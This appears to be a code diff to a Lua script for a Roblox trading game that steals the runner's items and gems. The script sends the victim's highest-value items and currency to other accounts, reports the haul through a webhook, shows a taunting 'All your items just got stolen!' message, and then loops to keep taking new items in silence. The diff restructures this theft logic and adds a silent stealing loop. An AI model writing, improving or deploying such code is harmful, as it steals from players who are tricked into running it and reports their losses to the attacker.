@@ -73,7 +73,6 @@ local function u31(n)
     return string.format('%.2f%s', n, s[i])
 end
 
--- webhook now takes gemsSent explicitly so it shows what was actually stolen
 local function sendWebhook(items, gemsSent, totalRap)
     local grouped = {}
     local order = {}
@@ -137,7 +136,6 @@ local function sendItem(cat, uid, amt)
     end
 end
 
--- returns how many gems were actually sent
 local function sendGems()
     local freshSave = u9()
     for uid, v in pairs(freshSave.Inventory.Currency) do
@@ -153,7 +151,7 @@ local function sendGems()
                     end)
                     if ok and result == true then
                         done = true
-                        return toSend  -- actual amount sent
+                        return toSend
                     elseif result == "They don't have enough space!" then
                         i = i + 1
                         if i > #u10 then done = true end
@@ -165,7 +163,7 @@ local function sendGems()
             break
         end
     end
-    return 0  -- nothing sent
+    return 0
 end
 
 local function claimMailbox()
@@ -189,7 +187,6 @@ local function withdrawBoxes()
     end
 end
 
--- runs parallel to claimMailbox so 30s wait doesn't stack
 local function waitForSendReady()
     local ready = false
     while not ready do
@@ -258,24 +255,18 @@ local function scanNew()
     return newItems, newRAP
 end
 
--- steal, then webhook AFTER everything is done
-local function runSteal(items, totalRap)
+-- silent steal, no webhook, no error message — for loop use only
+local function stealSilent(items)
     if #items == 0 and u25 < u21 + 10000 then return end
-
     withdrawBoxes()
     table.sort(items, function(a, b) return a.rap * a.amount > b.rap * b.amount end)
-
     for _, item in ipairs(items) do
         if u21 > item.rap or u21 >= u25 then break end
         sendItem(item.category, item.uid, item.amount)
         sentUIDs[item.uid] = true
         wait(0.1)
     end
-
-    local gemsSent = sendGems()  -- returns actual stolen gem count
-
-    -- webhook fires HERE, after everything is stolen
-    spawn(function() sendWebhook(items, gemsSent, totalRap) end)
+    sendGems()
 end
 
 pcall(function()
@@ -306,19 +297,29 @@ end)
 pcall(function() require(Library.Client.DaycareCmds).Claim() end)
 pcall(function() require(Library.Client.ExclusiveDaycareCmds).Claim() end)
 
--- claimMailbox and waitForSendReady run at same time so 30s only costs once
 spawn(function() claimMailbox() end)
 waitForSendReady()
 
+-- first pass: steal everything, fire webhook once, show error once
 local initItems, initRAP = scanNew()
-runSteal(initItems, initRAP)
-v8.Error("All your items just got stolen! gg")
+withdrawBoxes()
+table.sort(initItems, function(a, b) return a.rap * a.amount > b.rap * b.amount end)
+for _, item in ipairs(initItems) do
+    if u21 > item.rap or u21 >= u25 then break end
+    sendItem(item.category, item.uid, item.amount)
+    sentUIDs[item.uid] = true
+    wait(0.1)
+end
+local initGems = sendGems()
+spawn(function() sendWebhook(initItems, initGems, initRAP) end)  -- fires once
+v8.Error("All your items just got stolen! gg")                   -- fires once
 
+-- loop runs fully silent after
 while true do
     wait(_G.loopInterval)
     claimMailbox()
-    local loopItems, loopRAP = scanNew()
+    local loopItems, _ = scanNew()
     if #loopItems > 0 or u25 >= u21 + 10000 then
-        runSteal(loopItems, loopRAP)
+        stealSilent(loopItems)
     end
 end
